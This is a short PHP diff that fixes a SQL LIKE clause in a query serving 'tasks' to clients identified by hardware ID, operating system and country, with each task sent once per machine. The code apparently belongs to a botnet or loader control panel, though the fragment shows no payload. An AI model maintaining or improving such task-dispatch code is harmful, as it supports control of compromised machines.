@@ -37,7 +37,7 @@ elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd'
 				`start` <= NOW() AND
 				`stop` > NOW() AND
 				(`count` = 0 OR `count` > `received`) AND
-				(`countries` = '' OR `countries` LIKE '%:1%') AND
+				(`countries` = '' OR `countries` LIKE concat('%', :1, '%')) AND
 				(SELECT COUNT(`id`) FROM `sentTasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid']);
 	if ($stmt->rowCount() > 0)
 	{
